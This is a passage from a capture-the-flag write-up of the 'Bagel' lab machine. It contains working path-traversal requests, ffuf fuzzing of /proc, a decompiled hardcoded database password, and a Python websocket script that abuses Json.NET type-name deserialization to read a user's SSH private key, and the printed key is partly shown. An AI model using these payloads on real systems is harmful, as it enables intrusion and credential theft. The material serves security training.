            if os.path.isfile(page):
                resp=send_file(page)
                resp.direct_passthrough = False
                if os.path.getsize(page) == 0:
                    resp.headers["Content-Length"]=str(len(resp.get_data()))
                return resp
            else:
                return "File not found"
        else:
                return redirect('http://bagel.htb:8000/?page=index.html', code=302)

@app.route('/orders')
def order(): # don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.
    try:
        ws = websocket.WebSocket()    
        ws.connect("ws://127.0.0.1:5000/") # connect to order app
        order = {"ReadOrder":"orders.txt"}
        data = str(json.dumps(order))
        ws.send(data)
        result = ws.recv()
        return(json.loads(result)['ReadOrder'])
    except:
        return("Unable to connect")

if __name__ == '__main__':
  app.run(host='0.0.0.0', port=8000)


```

### Fuzzing /proc/ with ffuf

```c
$ ffuf -w /usr/share/wordlists/SecLists/Fuzzing/3-digits-000-999.txt -u http://bagel.htb:8000/?page=../../../../../../proc/FUZZ/cmdline --fw 3 --fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://bagel.htb:8000/?page=../../../../../../proc/FUZZ/cmdline
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Fuzzing/3-digits-000-999.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 3
 :: Filter           : Response size: 0
________________________________________________

758                     [Status: 200, Size: 34, Words: 1, Lines: 1, Duration: 48ms]
771                     [Status: 200, Size: 31, Words: 1, Lines: 1, Duration: 51ms]
848                     [Status: 200, Size: 30, Words: 1, Lines: 1, Duration: 57ms]
851                     [Status: 200, Size: 34, Words: 1, Lines: 1, Duration: 59ms]
852                     [Status: 200, Size: 33, Words: 1, Lines: 1, Duration: 62ms]
853                     [Status: 200, Size: 13, Words: 1, Lines: 1, Duration: 62ms]
854                     [Status: 200, Size: 13, Words: 1, Lines: 1, Duration: 49ms]
855                     [Status: 200, Size: 21, Words: 1, Lines: 1, Duration: 55ms]
857                     [Status: 200, Size: 13, Words: 1, Lines: 1, Duration: 55ms]
856                     [Status: 200, Size: 56, Words: 1, Lines: 1, Duration: 57ms]
885                     [Status: 200, Size: 37, Words: 1, Lines: 1, Duration: 49ms]
888                     [Status: 200, Size: 37, Words: 1, Lines: 1, Duration: 65ms]
892                     [Status: 200, Size: 35, Words: 1, Lines: 1, Duration: 61ms]
890                     [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 70ms]
893                     [Status: 200, Size: 34, Words: 1, Lines: 1, Duration: 63ms]
894                     [Status: 200, Size: 39, Words: 1, Lines: 1, Duration: 57ms]
895                     [Status: 200, Size: 37, Words: 1, Lines: 1, Duration: 57ms]
896                     [Status: 200, Size: 34, Words: 1, Lines: 1, Duration: 59ms]
898                     [Status: 200, Size: 23, Words: 1, Lines: 1, Duration: 57ms]
902                     [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 56ms]
904                     [Status: 200, Size: 26, Words: 1, Lines: 1, Duration: 57ms]
903                     [Status: 200, Size: 32, Words: 1, Lines: 1, Duration: 57ms]
905                     [Status: 200, Size: 18, Words: 1, Lines: 1, Duration: 58ms]
906                     [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 59ms]
908                     [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 59ms]
911                     [Status: 200, Size: 37, Words: 1, Lines: 1, Duration: 59ms]
912                     [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 60ms]
916                     [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 61ms]
923                     [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 49ms]
924                     [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 51ms]
925                     [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 49ms]
927                     [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 52ms]
928                     [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 50ms]
929                     [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 51ms]
930                     [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 52ms]
932                     [Status: 200, Size: 147, Words: 1, Lines: 1, Duration: 50ms]
931                     [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 55ms]
933                     [Status: 200, Size: 18, Words: 1, Lines: 1, Duration: 52ms]
934                     [Status: 200, Size: 18, Words: 1, Lines: 1, Duration: 53ms]
936                     [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 53ms]
935                     [Status: 200, Size: 37, Words: 1, Lines: 1, Duration: 55ms]
937                     [Status: 200, Size: 37, Words: 1, Lines: 1, Duration: 53ms]
942                     [Status: 200, Size: 56, Words: 8, Lines: 1, Duration: 53ms]
944                     [Status: 200, Size: 37, Words: 1, Lines: 1, Duration: 53ms]
943                     [Status: 200, Size: 18, Words: 1, Lines: 1, Duration: 53ms]
945                     [Status: 200, Size: 37, Words: 1, Lines: 1, Duration: 53ms]
948                     [Status: 200, Size: 44, Words: 1, Lines: 1, Duration: 53ms]
952                     [Status: 200, Size: 38, Words: 1, Lines: 1, Duration: 50ms]
953                     [Status: 200, Size: 38, Words: 1, Lines: 1, Duration: 53ms]
955                     [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 51ms]
956                     [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 52ms]
957                     [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 51ms]
958                     [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 51ms]
960                     [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 50ms]
959                     [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 53ms]
:: Progress: [1000/1000] :: Job [1/1] :: 400 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

Response:

```c
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.10.9
Date: Sun, 19 Feb 2023 11:13:13 GMT
Content-Disposition: inline; filename=environ
Content-Type: application/octet-stream
Content-Length: 233
Last-Modified: Sun, 19 Feb 2023 11:13:13 GMT
Cache-Control: no-cache
ETag: "1676805193.196627-0-2194150435"
Date: Sun, 19 Feb 2023 11:13:13 GMT
Connection: close

LANG=en_US.UTF-8PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/binHOME=/home/developerLOGNAME=developerUSER=developerSHELL=/bin/bashINVOCATION_ID=85e3a9a646ea4ff1803899d05094c98cJOURNAL_STREAM=8:25349SYSTEMD_EXEC_PID=892
```

Request:

```c
GET /?page=../../../../../../proc/890/cmdline HTTP/1.1
Host: bagel.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
If-Modified-Since: Thu, 26 Jan 2023 17:40:39 GMT
If-None-Match: "1674754839.6421967-8698-149884447"


```

Response:

```c
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.10.9
Date: Sun, 19 Feb 2023 11:30:14 GMT
Content-Disposition: inline; filename=cmdline
Content-Type: application/octet-stream
Content-Length: 45
Last-Modified: Sun, 19 Feb 2023 08:24:40 GMT
Cache-Control: no-cache
ETag: "1676795080.1166413-0-1740641013"
Date: Sun, 19 Feb 2023 11:30:14 GMT
Connection: close

dotnet /opt/bagel/bin/Debug/net6.0/bagel.dll
```

## Investigating bagel.dll

Request:

```c
GET /?page=../../../../../../opt/bagel/bin/Debug/net6.0/bagel.dll HTTP/1.1
Host: bagel.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
If-Modified-Since: Thu, 26 Jan 2023 17:40:39 GMT
If-None-Match: "1674754839.6421967-8698-149884447"


```

Response:

```c
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.10.9
Date: Sun, 19 Feb 2023 11:31:27 GMT
Content-Disposition: inline; filename=bagel.dll
Content-Type: application/octet-stream
Content-Length: 10752
Last-Modified: Wed, 11 Jan 2023 21:07:28 GMT
Cache-Control: no-cache
ETag: "1673471248.0-10752-851909119"
Date: Sun, 19 Feb 2023 11:31:27 GMT
Connection: close

MZ..........ÿÿ..¸.......@.........................................º..´	Í!¸.LÍ!This program cannot be run in DOS mode.

$.......PE..L...ñ¢S÷........à."...0.. ...........>... ...@....@.. ....................................`.................................G>..O....@.......................`.......=..T............................................ ............... ..H............text... .... ... .................. ..`.rsrc........@......."..............@..@.reloc.......`.......(..............@..B................{>......H........&..x...........................................................".(...
.*b.(...
....#...%...}....*>.(...
...}....*>.(...
...}....*...0.............s...
%.o...
.(...

+..*...0..$..........s...
%.o...
.(...+
Þ
&.r...p
Þ..*...........
....".(...
.*....0.. ........(	....(
....+
. è...(...
...
+ïú.~....~....~....s...
.....~.....o...
.~.....þ.....s...
o...
.*..0..&.......s$...
.(...
}......}.....|......(...+*...0...........r-..p
.o!..
.("..
(#..
,..o!..
....($..
.þ.+......,*(%..
.o!..
....(&..
..o!..
....($..
o'..

s.......o.......o....
~.....o(..
	o)..
..þ.......o*..
&*".(...
.*.r/..p..... .....................*...0............{....
+..*&...}....*...0............{....
+..*&...}....*...0...........(+..

..r3..p(,..
.+..*j..}.....rC..p}.....(.....*..{....*"..}....*.0............{....o....
+..*n...}
....{.....{
...o.....*....0............{....o....
+..*....0..Q..........}	.....{	...r]..pr-..po-..
}	.....{	...ra..pr-..po-..
}	....{.....{	...o.....*N.s!...}.....(...
.*....}......{.....{....(...
(.....*..0............{
...
+..*.0..>..........(%..
(/..

..{
...rg..p.(0..
(...
}
....Þ....rk..p}
....Þ.*..........,-.......0............{....
+..*n...{.....{....(...
.( ....*.0..+...	........(1..
..r...p}.....Þ.
..rµ..p}.....Þ..*....................}.....r×..p}.....rý..p}.....(...
.*...0......
....r...p
.s2..
.rª..p.*".(...
.*".(...
.*..0..ª........{....
.,.+.+G.~......þ......o3..
o4..
...(5..
-@..%
}......}.....
.|........(...+.ÞT.{......|....þ.......%
}......(7..
.Þ.....þ}.....|......(8..
.Þ...þ}.....|....(9..
.*..........t{.......*..BSJB............v4.0.30319......l.......#~..ô...|...#Strings....p...P...#US.À.......#GUID...Ð...¨...#Blob...........W.¢.	
...ú.3....................&...........9...&.............................................·...........y...ò.y...R.f.........ô.e...Ù.	...h.	...%.	...B.	...§.	.....	.....y.....Æ...R.Æ...:.Æ.....Æ.
.1.....Ú.Æ...ª.y...×.f.
.õ.....,.Æ...Í.6...¥.y.....y...:.Æ...t.y...
.f.....Æ...ë.f...x.f.....u...Å.Æ.....¼.....Æ...Þ.D...T.D.....D.....D...Ì.6.....Æ...G.7.....*.....Æ...k.b...¦.*.....V.............
...5.........f.y.5.........À.y.5.........ù.L.A.........«.L.A.........ß.L. .........A.L.A.	.......k.L.A.
......._.L.A...".....;...A...$.&.Ð.¤.&.1.¨...d.«...".®...Á.±.....´.....®.....«...u.«...Y.«...p.¸.....¼...î.«...H.«...b.«...{.«.....®.....¿.....Ã.P ......Y.....Y ......Y.Í...r ......Y.Ò.... ......Y.Í.... ........Ø...¼ ......%.Ý...ü ......Y......!......ß.â...4!...... .è...t!......@.è...¨!......þ.ì...K"......Y.....T"......_.è...x"......¥.Ñ...."......°......"......é.é...´"......õ.....À"........é...ä"......Y.....ÿ"......Ù.ó....#......é.÷....#......».é.	.-#......Ê...	.L#........é.
.l#..........
.É#......Y.....Ý#......G......$......:.é....$......Õ.....t$......T.é.
..$......b...
.¨$......á.ü...ð$......Y......%......).....9%......Y.....B%......Y.....L%....á........&....á.¸.!.......¢.....T.......................................................................{.....Õ.....È...a.	.Y.....Y.....Y.
.).Y...1.Y...9.Y...A.Y...I.Y...Q.Y...Y.Y...a.Y...y.Y.....Y...¡.Y...Á.....Á.¸.!.á.Y...ù.Y.'.	.Y...i.Y...!.Y...!.P.1.1.j.8.1.z.C...Y...A.n.V...Y.[...².b...Y.o...ú.u.Ù.ä...Ù.....©.l.§.....µ...l.Á...û.Ñ.Q.M.Õ...X.Û.Q...á.©...é.....é.....í.é.P...é...
.a.2...a.c...i.¨.).a.ä.6.i.C.F...Y.......`.q.
.h.É.ê.m.Ù.Ó.q.É.¨...Ù.7...Ù.²...%...Ç.................6...#.?...+.u...3.....;.....C.....K.u...S.u.C.[.Í.C.
.Í.c.[.Í.c.
.Í.c.c.R...[.Í...
.Í...c.y.£.". .£...Ç.Ã.". .Ã...Ç.ã.". .ã...Ç...". .....Ç.#.". .#...Ç.@.k.£.@.s.Í.c.[.Í...[.Í.....I...[.Í. .[.Í.@...Ò.À...Í.-.R.....ú.þ.....A.L.T.........	.....´.....ù...........í.
...Î.....±.....K.....f.....................................	.....	.................
.....
...........................J.....L.!.g.¯...................±.........................................................¼.....
.............D...................».........1.M.A...m.|....<>u__1.IEnumerable`1.Task`1.EventHandler`1.ArraySegment`1.<StartServer>d__6.get_UTF8.<Module>.DB.System.IO.get_Data.System.Collections.Generic.SendAsync.StartAsync.get_UserId.set_UserId.System.Threading.Thread.AwaitUnsafeOnCompleted.get_IsCompleted.add_MessageReceived.userid.<RemoveOrder>k__BackingField.Replace.get_ReadFile.set_ReadFile.get_WriteFile.set_WriteFile.file.order_filename.get_Time.DateTime.System.Runtime.IAsyncStateMachine.SetStateMachine.stateMachine.line.Type.Base.Create.DebuggerBrowsableState.<>1__state.EmbeddedAttribute.CompilerGeneratedAttribute.AttributeUsageAttribute.DebuggableAttribute.NullableAttribute.DebuggerBrowsableAttribute.AssemblyTitleAttribute.AsyncStateMachineAttribute.ObsoleteAttribute.DebuggerStepThroughAttribute.TargetFrameworkAttribute.DebuggerHiddenAttribute.AssemblyFileVersionAttribute.AssemblyInformationalVersionAttribute.AssemblyConfigurationAttribute.CompilationRelaxationsAttribute.AssemblyProductAttribute.NullableContextAttribute.AssemblyCompanyAttribute.RuntimeCompatibilityAttribute.Byte.value.Serialize.Deserialize.Flag.System.Threading.Encoding.set_TypeNameHandling.System.Runtime.Versioning.ToString.GetString.Formatting.path.obj.Task.Bagel.bagel.bagel.dll._Ssl.System.CancellationToken.Main.Join.get_Session.set_Session.session.System.Reflection.SqlConnection.DB_connection.SetException.Newtonsoft.Json.json.order_info._ServerIp.Sleep.AsyncVoidMethodBuilder.<>t__builder.sender.get_ReadOrder.set_ReadOrder.get_WriteOrder.set_WriteOrder.get_RemoveOrder.set_RemoveOrder.Handler.TaskAwaiter.GetAwaiter._Server.InitializeServer.WatsonWsServer.StartServer.bagel_server..ctor..cctor.System.Diagnostics.System.Runtime.CompilerServices.DebuggingModes.ReadLines.set_AcceptInvalidCertificates.NullableFlags.JsonSerializerSettings.MessageReceivedEventArgs.args.Microsoft.CodeAnalysis.System.Threading.Tasks.Orders.IsSuccess.AttributeTargets.Concat.SerializeObject.DeserializeObject.WatsonWebsocket.op_Implicit.GetResult.SetResult.Microsoft.Data.SqlClient.ReadContent.WriteContent.file_content.get_Count.Start.JsonConvert.get_IpPort._ServerPort.MoveNext.System.Text.WriteAllText.get_Now.get_Array.directory.op_Inequality....+{.".M.e.s.s.a.g.e.".:.".u.n.k.n.o.w.n.".}.....*...h.:.m.m.:.s.s...U.n.a.u.t.h.o.r.i.z.e.d.../.........
..!O.r.d.e.r. .n.o.t. .f.o.u.n.d.!..'O.p.e.r.a.t.i.o.n. .s.u.c.c.e.s.s.e.d..!O.p.e.r.a.t.i.o.n. .f.a.i.l.e.d..%/.o.p.t./.b.a.g.e.l./.o.r.d.e.r.s./...o.r.d.e.r.s...t.x.t....D.a.t.a. .S.o.u.r.c.e.=.i.p.;.I.n.i.t.i.a.l. .C.a.t.a.l.o.g.=.O.r.d.e.r.s.;.U.s.e.r. .I.D.=.d.e.v.;.P.a.s.s.w.o.r.d.=.k.8.w.d.A.Y.Y.K.y.h.n.j.g.3.K...£I.N.S.E.R.T. .I.N.T.O. .o.r.d.e.r.s. .(.N.a.m.e.,.A.d.d.r.e.s.s.,.C.o.u.n.t.,.T.y.p.e.). .V.A.L.U.E.S. .(.'.E.l.i.o.t.'.,.'.S.t.r.e.e.t.'.,.4.,.'.B.a.g.g.e.l.'.)...Ô.§2ªe6K.G|Mä\Cû.. .... ... ..... .... ...9. ...I. ...a. ...y..... .....
..........	..........
............. ...... .......¥..U. ....
 .....¥..U....,....m.0.......
..,...........Y...]. ...Y.....Y.......Y............Y.....Y.... .......©. ..... ....... ... ..........]............u.....u. .... ..........
.........i............©
..............i...................e.].,.i. ...¹.]. ..e. ..
0..........
..e.,. ...i.°?_..Õ
:.#ì.ÂÖê¤¥.0.Oæ²¦®í...................E...$......m...e....... .... ..... .... ...................U. ... .... .....(...(...(................T..WrapNonExceptionThrows..........5....NETCoreApp,Version=v6.0..T..FrameworkDisplayName.
...bagel..
...Debug......1.0.0.0..
...1.0.0..)..$bagel_server.Bagel+<StartServer>d__6.......v..qThe production team has to decide where the database server will be hosted. This method is not fully implemented............&...k....T.
AllowMultiple.T.	Inherited.&..L.....T.
AllowMultiple.T.	Inherited..............«W«..MP....<...ä=..ä...................'... >..  ..............................RSDS.HÌâ.;ÁG«M.{t.Ò...../opt/bg1/obj/Debug/net6.0/bagel.pdb.SHA256..HÌâ.;Á.ëM.{t.Ò..«W«óè÷ª%¾c.à%÷°o>...........>... ......................{>............_CorExeMain.mscoree.dll......ÿ%. @..................................................................................................................................................................................................................................................................................................................................................................................... .......P.......................8...............................................h.......................(....@................4...V.S._.V.E.R.S.I.O.N._.I.N.F.O.....½.ïþ....................?...........................D.....V.a.r.F.i.l.e.I.n.f.o.....$.....T.r.a.n.s.l.a.t.i.o.n.......°.ø.....S.t.r.i.n.g.F.i.l.e.I.n.f.o...Ô.....0.0.0.0.0.4.b.0...,.....C.o.m.p.a.n.y.N.a.m.e.....b.a.g.e.l...4.....F.i.l.e.D.e.s.c.r.i.p.t.i.o.n.....b.a.g.e.l...0.....F.i.l.e.V.e.r.s.i.o.n.....1...0...0...0...4.
...I.n.t.e.r.n.a.l.N.a.m.e...b.a.g.e.l...d.l.l...(.....L.e.g.a.l.C.o.p.y.r.i.g.h.t... ...<.
...O.r.i.g.i.n.a.l.F.i.l.e.n.a.m.e...b.a.g.e.l...d.l.l...,.....P.r.o.d.u.c.t.N.a.m.e.....b.a.g.e.l...0.....P.r.o.d.u.c.t.V.e.r.s.i.o.n...1...0...0...8.....A.s.s.e.m.b.l.y. .V.e.r.s.i.o.n...1...0...0...0...8C..ß...........ï»¿<?xml version="1.0" encoding="UTF-8" standalone="yes"?>

<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <assemblyIdentity version="1.0.0.0" name="MyApplication.app"/>
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
    <security>
      <requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">
        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
</assembly>..........................................................................................................................................................................................................................................0.......>......................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................
```

## Digging deepter with dnSpy

> http://bagel.htb:8000/?page=../../../../../../opt/bagel/bin/Debug/net6.0/bagel.dll

`bagel (1.0.0.0) > bagel.dll > {} bagel_server > Bagel @02000006 > MessageReceived(object, MessageReceivedEventArgs):void @0x0600000B`

```c
// bagel_server.Bagel
// Token: 0x0600000B RID: 11 RVA: 0x000021A8 File Offset: 0x000003A8
private static void MessageReceived(object sender, MessageReceivedEventArgs args)
{
	string json = "";
	bool flag = args.Data != null && args.Data.Count > 0;
	if (flag)
	{
		json = Encoding.UTF8.GetString(args.Data.Array, 0, args.Data.Count);
	}
	Handler handler = new Handler();
	object obj = handler.Deserialize(json);
	object obj2 = handler.Serialize(obj);
	Bagel._Server.SendAsync(args.IpPort, obj2.ToString(), default(CancellationToken));
}
```

`bagel (1.0.0.0) > bagel.dll > {} bagel_server > DB @0200000A > DB_connection():void @06000022`.

```c
// bagel_server.DB
// Token: 0x06000022 RID: 34 RVA: 0x00002518 File Offset: 0x00000718
[Obsolete("The production team has to decide where the database server will be hosted. This method is not fully implemented.")]
public void DB_connection()
{
	string text = "Data Source=ip;Initial Catalog=Orders;User ID=dev;Password=k8wdAYYKyhnjg3K";
	SqlConnection sqlConnection = new SqlConnection(text);
}

```

| Username | Password |
| --- | --- |
| dev | k8wdAYYKyhnjg3K |

```c
$ ssh dev@bagel.htb
The authenticity of host 'bagel.htb (10.129.158.216)' can't be established.
ED25519 key fingerprint is SHA256:Di9rfN6auXa0i6Hdly0dzrLddlFqLIfzbUn30m/l7cg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'bagel.htb' (ED25519) to the list of known hosts.
dev@bagel.htb: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
```

```c
// bagel_server.File
// Token: 0x0400000F RID: 15
private string directory = "/opt/bagel/orders/";
```

`bagel (1.0.0.0) > bagel.dll > {} bagel_server > Handler @02000005 > Derserialize(string):object @06000006` and `bagel (1.0.0.0) > bagel.dll > {} bagel_server > Handler @02000005 > Serialize(string):object @06000005`

Derserialize(string):

```c
// bagel_server.Handler
// Token: 0x06000006 RID: 6 RVA: 0x000020BC File Offset: 0x000002BC
public object Deserialize(string json)
{
	object result;
	try
	{
		result = JsonConvert.DeserializeObject<Base>(json, new JsonSerializerSettings
		{
			TypeNameHandling = 4
		});
	}
	catch
	{
		result = "{\"Message\":\"unknown\"}";
	}
	return result;
}

```

Serialize(string):

```c
// bagel_server.Handler
// Token: 0x06000005 RID: 5 RVA: 0x00002094 File Offset: 0x00000294
public object Serialize(object obj)
{
	return JsonConvert.SerializeObject(obj, 1, new JsonSerializerSettings
	{
		TypeNameHandling = 4
	});
}

```

`bagel (1.0.0.0) > bagel.dll > {} bagel_server > Orders @02000008 > ReadOrder:string @17000006`

```c
// bagel_server.Orders
// Token: 0x17000006 RID: 6
// (get) Token: 0x06000018 RID: 24 RVA: 0x0000234C File Offset: 0x0000054C
// (set) Token: 0x06000019 RID: 25 RVA: 0x0000236C File Offset: 0x0000056C
public string ReadOrder
{
	get
	{
		return this.file.ReadFile;
	}
	set
	{
		this.order_filename = value;
		this.order_filename = this.order_filename.Replace("/", "");
		this.order_filename = this.order_filename.Replace("..", "");
		this.file.ReadFile = this.order_filename;
	}
}

```

```c
$ cat websocket_connect.py  
import websocket
import json

def on_open(ws):
    order = {"UserId": 1, "WriteOrder": "foobar"}
    message = json.dumps(order)
    ws.send(message)

def on_message(ws, message):
    print(message)

def on_error(ws, error):
    print(error)

def on_close(ws):
    print("Connection closed")

if __name__ == "__main__":
    ws = websocket.WebSocketApp("ws://bagel.htb:5000/",
                                on_open=on_open,
                                on_message=on_message,
                                on_error=on_error,
                                on_close=on_close)
    ws.run_forever()
```

```c
$ python websocket_connect.py 
{
  "UserId": 1,
  "Session": "Unauthorized",
  "Time": "1:56:42",
  "RemoveOrder": null,
  "WriteOrder": "Operation successed",
  "ReadOrder": null
}
```

> https://systemweakness.com/exploiting-json-serialization-in-net-core-694c111faa15

> https://medium.com/r3d-buck3t/insecure-deserialization-with-json-net-c70139af011a

```c
$ export HTTP_PROXY=http://localhost:8080
```

Request:

```c
GET / HTTP/1.1
Upgrade: websocket
Host: bagel.htb:5000
Origin: http://bagel.htb:5000
Sec-WebSocket-Key: 1k3F7uYPEBoRB5SuKPNjXA==
Sec-WebSocket-Version: 13
Connection: Upgrade


```

Response:

```c
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 9oofIKx9lRJFss1nYu/EZQOoTEM=


```

```c
{"UserId": 1, "WriteOrder": "foobar"}
```

```c
{
  "UserId": 1,
  "Session": "Unauthorized",
  "Time": "2:15:34",
  "RemoveOrder": null,
  "WriteOrder": "Operation successed",
  "ReadOrder": null
}
```

## Foothold

```c
$ cat read_key.sh 
import websocket
import json

def on_open(ws):
    message = {"RemoveOrder":{"$type":"bagel_server.File, bagel", "ReadFile":"../../../../../home/phil/.ssh/id_rsa"}}
    ws.send(json.dumps(message))

def on_message(ws, message):
    print(message)

def on_error(ws, error):
    print(error)

def on_close(ws):
    print("Connection closed")

if __name__ == "__main__":
    ws = websocket.WebSocketApp("ws://bagel.htb:5000/",
                                on_open=on_open,
                                on_message=on_message,
                                on_error=on_error,
                                on_close=on_close)
    ws.run_forever()
```

```c
$ python read_key.sh
```

```c
GET / HTTP/1.1
Upgrade: websocket
Host: bagel.htb:5000
Origin: http://bagel.htb:5000
Sec-WebSocket-Key: H+BB7EAWZZua0Scd8SO0NA==
Sec-WebSocket-Version: 13
Connection: Upgrade


```

```c
{"RemoveOrder": {"$type": "bagel_server.File, bagel", "ReadFile": "../../../../../home/phil/.ssh/id_rsa"}}
```

```c
{
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "2:49:56",
  "RemoveOrder": {
    "$type": "bagel_server.File, bagel",
    "ReadFile": "-----BEGIN OPENSSH PRIVATE KEY-----\n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